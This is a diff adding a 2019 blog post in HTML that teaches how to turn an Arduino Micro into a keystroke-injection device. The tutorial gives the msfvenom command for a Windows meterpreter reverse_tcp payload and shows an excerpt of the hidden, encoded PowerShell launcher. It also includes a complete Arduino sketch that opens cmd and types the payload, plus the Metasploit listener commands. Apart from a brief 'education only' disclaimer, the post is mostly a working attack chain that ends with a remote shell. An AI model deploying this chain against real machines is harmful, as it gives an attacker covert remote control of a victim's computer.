@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="dcterms.date" content="2019-03-17" />
+  <title>USB Rubber Ducky with Arduino Micro</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    /* CSS for syntax highlighting */
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {  background-color: #f8f8f8; }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ef2929; } /* Alert */
+    code span.an { color: #8f5902; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #204a87; } /* Attribute */
+    code span.bn { color: #0000cf; } /* BaseN */
+    code span.cf { color: #204a87; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4e9a06; } /* Char */
+    code span.cn { color: #8f5902; } /* Constant */
+    code span.co { color: #8f5902; font-style: italic; } /* Comment */
+    code span.cv { color: #8f5902; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #8f5902; font-weight: bold; font-style: italic; } /* Documentation */
+    code span.dt { color: #204a87; } /* DataType */
+    code span.dv { color: #0000cf; } /* DecVal */
+    code span.er { color: #a40000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #0000cf; } /* Float */
+    code span.fu { color: #204a87; font-weight: bold; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #8f5902; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #204a87; font-weight: bold; } /* Keyword */
+    code span.op { color: #ce5c00; font-weight: bold; } /* Operator */
+    code span.ot { color: #8f5902; } /* Other */
+    code span.pp { color: #8f5902; font-style: italic; } /* Preprocessor */
+    code span.sc { color: #ce5c00; font-weight: bold; } /* SpecialChar */
+    code span.ss { color: #4e9a06; } /* SpecialString */
+    code span.st { color: #4e9a06; } /* String */
+    code span.va { color: #000000; } /* Variable */
+    code span.vs { color: #4e9a06; } /* VerbatimString */
+    code span.wa { color: #8f5902; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+      html, body {
+          margin-top: 1%;
+          margin-left: 10%;
+          margin-right: 10%;
+          background-color: #fbfbfb;
+          color: #403f52;
+          font-family: 'KaTeX_SansSerif';
+          font-size: 18px;
+      }
+
+      img {
+          max-width: 80%;
+      }
+
+      figcaption{
+          font-style: italic;
+      }
+
+      pre code {
+          display:inline-block;
+          font-size: 14px;
+          margin: 10px 10px 10px 10px;
+      }
+
+      code {
+          display:inline-block;
+          font-size: 14px;
+      }
+
+      .footer {
+          text-align: center;
+          margin-top: 1%;
+          margin-bottom: 1%;
+      }
+
+      .date {
+          font-style: italic;
+      }
+
+      a { color: inherit; }
+  </style>
+
+  <script src="https://kit.fontawesome.com/fa8004ee4c.js" crossorigin="anonymous"></script>
+
+  <h1>
+      <a href="/index.html" style="text-decoration:none">Miraç Lütfullah Gülgönül</a>
+  </h1>
+
+  <hr>
+
+  <script defer=""
+  src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"></script>
+  <script>document.addEventListener("DOMContentLoaded", function () {
+ var mathElements = document.getElementsByClassName("math");
+ var macros = [];
+ for (var i = 0; i < mathElements.length; i++) {
+  var texText = mathElements[i].firstChild;
+  if (mathElements[i].tagName == "SPAN") {
+   katex.render(texText.data, mathElements[i], {
+    displayMode: mathElements[i].classList.contains('display'),
+    throwOnError: false,
+    macros: macros,
+    fleqn: false
+   });
+}}});
+  </script>
+  <link rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css" />
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">USB Rubber Ducky with Arduino Micro</h1>
+<p class="date">17 March 2019</p>
+</header>
+<p><strong><em>DISCLAIMER:</em></strong> <em>This is merely a proof of
+concept for education purposes. Use it only against your own networks
+and devices!</em></p>
+<p>In this post I will show you how to open a <a
+href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">meterpreter
+backdoor</a> in a target Windows system using a Arduino Micro acting as
+a HID keyboard. This attack vector was first developed by the <a
+href="https://shop.hak5.org">Hak5</a> community, given the name <a
+href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki">Rubber
+Ducky</a>. It basically exploits the fact that some micro-controllers
+have the capacity to act as a <a
+href="https://en.wikipedia.org/wiki/Human_interface_device">HID</a>,
+which you can use to send commands as if they were coming from a plugged
+in keyboard.</p>
+<h1 id="requirements">Requirements</h1>
+<h2 id="metasploit-framework">Metasploit Framework</h2>
+<p><a href="https://www.metasploit.com">Metasploit</a> is a penetration
+testing framework which we will use to generate the payload, listen to
+the backdoor and spawn a meterpreter shell on the target system. The
+site provides various installers for OS X, Windows (32-bit) and Linux, I
+will be doing this on a Debian Linux system, but there is no reason why
+it wouldn’t work on any other.</p>
+<h2 id="arduino-micro">Arduino Micro</h2>
+<p><a href="https://store.arduino.cc/usa/arduino-micro">Arduino
+Micro</a> is the smallest Arduino board using a micro-controller capable
+of HID simulation (<a
+href="https://www.microchip.com/wwwproducts/ATmega32u4">ATmega32U4</a>)
+in our case. We will also use the Arduino IDE to program the board.</p>
+<h1 id="code">Code</h1>
+<h2 id="msfvenom">msfvenom</h2>
+<p>First the will need to generate the things which the Arduino will
+“type”. This will be a <code>reverse_tcp</code> payload delivered with a
+Powershell command. Once in <code>msfconsole</code>, you can type</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>msfvenom <span class="op">-</span>p windows<span class="op">/</span>x64<span class="op">/</span>meterpreter<span class="op">/</span>reverse_tcp <span class="op">-</span>f psh<span class="op">-</span>cmd LPORT<span class="op">=</span><span class="dv">4444</span> LHOST<span class="op">=</span>YOUR_IP_ADDRESS <span class="op">-</span>o rbr0</span></code></pre></div>
+<p>If the target Windows machine is in your local network, then replace
+<code>YOUR_IP_ADDRESS</code> with your local IP address. If the target
+machine is outside your network, then you will need to provide your
+global IP address (try <code>curl icanhazip.com</code>). However, this
+will also require <a href="https://portforward.com">port forwarding</a>
+if you are behind a router. I am doing this on a <a
+href="https://cloud.google.com/compute/docs/instances/">Google Cloud VM
+instance</a>, so I simply had to setup a firewall rule to allow all
+incoming <code>tcp:4444</code> connections. This command will produce a
+file named <code>rbr</code> with a content similar to:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="op">%</span>COMSPEC<span class="op">%</span> <span class="op">/</span>b <span class="op">/</span>c start <span class="op">/</span>b <span class="op">/</span>min powershell<span class="op">.</span>exe <span class="op">-</span>nop <span class="op">-</span>w hidden <span class="op">-</span>e aQBmACgAWwBJAG <span class="op">...</span></span></code></pre></div>
+<p>This command is basically what will allow us to spawn a meterpreter
+shell in the target system. Now we will have to find a way to “type”
+it.</p>
+<h2 id="arduino">Arduino</h2>
+<p>The Arduino <a
+href="https://www.arduino.cc/reference/en/language/functions/usb/keyboard/">Keyboard</a>
+library allows one to “send keystrokes to an attached computer through
+their micro’s native USB port”. So our job is to simply save the command
+as a string and then type it out. However, there is a subtle problem:
+the command is about 7KB’s. The onboard SRAM memory storing the code
+variables on the ATmega32U4 only has a 2.5 KB capacity. This means we
+will have to use the onboard flash memory of 32 KB, since the command to
+be typed out doesn’t change. The Arduino IDE provides the keyword <a
+href="https://www.arduino.cc/reference/en/language/variables/utilities/progmem/">PROGMEM</a>
+for this. Data stored in this manner also has its own functions for
+access, so use caution.</p>
+<p>The command is to be written on the Windows Command Prompt, so we
+will also have to send the keystrokes Windows(❖) + R then type
+<code>cmd</code> then press <code>ENTER</code> to get a <code>cmd</code>
+window.</p>
+<p>Below is the Arduino sketch that I have come up with:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co"> *    USB Rubber Ducky with Arduino Micro</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="co"> *    </span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"> *    Provided the output of a psh-cmd from msfvenom, this code spawns a meterpreter session in the Windows target machine.</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="co"> *    The psh-cmd is stored in the FLASH memory, so the maximum command size is about 28KB in an Arduino Micro.</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="co"> *    The whole thing takes about 16 seconds to execute with a command of 7KB.</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="co"> *    </span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="co"> *    Created 17 March 2019</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="co"> *    By Mirac L. Gulgonul</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="co"> *    </span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="co"> *    https://mlg556.github.io</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="co"> *    </span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="co"> *    This work is licensed under a Creative Commons Attribution-ShareAlike 3.0 Unported License</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="co"> *    https://creativecommons.org/licenses/by-sa/3.0/</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&quot;Keyboard.h&quot;</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="at">const</span> <span class="dt">char</span> command<span class="op">[]</span> PROGMEM <span class="op">=</span> <span class="op">{};</span> <span class="co">// Array pre-allocation on the FLASH memory to store the command.</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> chr<span class="op">;</span> <span class="co">// Variable to store the current character of the command.</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="co">// The main method, initialises the Keyboard module, opens the Command Prompt and sends the command.</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> setup<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>    Keyboard<span class="op">.</span>begin<span class="op">();</span></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    delay<span class="op">(</span><span class="dv">500</span><span class="op">);</span> <span class="co">// The minimum delay needed.</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>    cmdOpen<span class="op">();</span></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a>    typer<span class="op">();</span></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>    Keyboard<span class="op">.</span>write<span class="op">(</span>KEY_RETURN<span class="op">);</span></span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a><span class="co">// Does nothing</span></span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> loop<span class="op">()</span> <span class="op">{}</span></span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a><span class="co">// Sends the keystrokes of the psh-command by looping through every character and using Keyboard.write()</span></span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> typer<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> strlen_P<span class="op">(</span>command<span class="op">);</span> i<span class="op">++)</span> <span class="op">{</span></span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a>        chr <span class="op">=</span> pgm_read_byte_near<span class="op">(</span>command <span class="op">+</span> i<span class="op">);</span></span>
+<span id="cb3-38"><a href="#cb3-38" aria-hidden="true" tabindex="-1"></a>        Keyboard<span class="op">.</span>write<span class="op">(</span>chr<span class="op">);</span></span>
+<span id="cb3-39"><a href="#cb3-39" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb3-40"><a href="#cb3-40" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb3-41"><a href="#cb3-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-42"><a href="#cb3-42" aria-hidden="true" tabindex="-1"></a><span class="co">// Opens the command prompt: hitting Windows+R, typing &quot;cmd&quot; and pressing ENTER.</span></span>
+<span id="cb3-43"><a href="#cb3-43" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> cmdOpen<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb3-44"><a href="#cb3-44" aria-hidden="true" tabindex="-1"></a>    Keyboard<span class="op">.</span>press<span class="op">(</span>KEY_LEFT_GUI<span class="op">);</span></span>
+<span id="cb3-45"><a href="#cb3-45" aria-hidden="true" tabindex="-1"></a>    Keyboard<span class="op">.</span>press<span class="op">(</span><span class="ch">&#39;r&#39;</span><span class="op">);</span></span>
+<span id="cb3-46"><a href="#cb3-46" aria-hidden="true" tabindex="-1"></a>    delay<span class="op">(</span><span class="dv">30</span><span class="op">);</span></span>
+<span id="cb3-47"><a href="#cb3-47" aria-hidden="true" tabindex="-1"></a>    Keyboard<span class="op">.</span>releaseAll<span class="op">();</span></span>
+<span id="cb3-48"><a href="#cb3-48" aria-hidden="true" tabindex="-1"></a>    delay<span class="op">(</span><span class="dv">100</span><span class="op">);</span></span>
+<span id="cb3-49"><a href="#cb3-49" aria-hidden="true" tabindex="-1"></a>    Keyboard<span class="op">.</span>println<span class="op">(</span><span class="st">&quot;cmd&quot;</span><span class="op">);</span></span>
+<span id="cb3-50"><a href="#cb3-50" aria-hidden="true" tabindex="-1"></a>    Keyboard<span class="op">.</span>write<span class="op">(</span>KEY_RETURN<span class="op">);</span></span>
+<span id="cb3-51"><a href="#cb3-51" aria-hidden="true" tabindex="-1"></a>    delay<span class="op">(</span><span class="dv">500</span><span class="op">);</span></span>
+<span id="cb3-52"><a href="#cb3-52" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h2 id="msfconsole">msfconsole</h2>
+<p>Now that the payload is ready to be “typed”, we have to be listening
+to it. In <code>msfconsole</code>, type:</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>use exploit<span class="kw">/</span>multi<span class="kw">/</span>handler</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>set <span class="cn">PAYLOAD</span> windows<span class="kw">/</span>x64<span class="kw">/</span>meterpreter<span class="kw">/</span>reverse_tcp</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>set <span class="cn">LHOST</span> <span class="fl">0.0</span><span class="kw">.</span><span class="fl">0.0</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>set <span class="cn">LPORT</span> <span class="dv">4444</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>run</span></code></pre></div>
+<p>Now that we are listening, you can finally insert your Arduino/Rubber
+Ducky to the target machine. If all goes well (my version takes about 16
+seconds in total) you will be presented with a meterpreter session. Go
+crazy with it! (or type <code>help</code>).</p>
+<h1 id="downloads">Downloads</h1>
+<p><a href="files/rubber.ino">rubber.ino</a></p>
+<p><span class="math inline">\space</span></p>
+<hr>
+
+<div class="footer">
+
+    <p>
+        Miraç Lütfullah Gülgönül
+        <br>
+        <a class="fa-solid fa-globe" style="text-decoration:none" href="https://mlg556.github.io"></a>
+        &nbsp
+        <a class="fa-regular fa-envelope" style="text-decoration:none" href="mailto:miraclgulgonul@gmail.com"></a>
+        &nbsp
+        <a class="fa-brands fa-linkedin" style="text-decoration:none" href="https://www.linkedin.com/in/mira%C3%A7-g%C3%BClg%C3%B6n%C3%BCl-b787841b5/"></a> 
+    </p>
+
+
+</div>
+
+</body>
+</html>
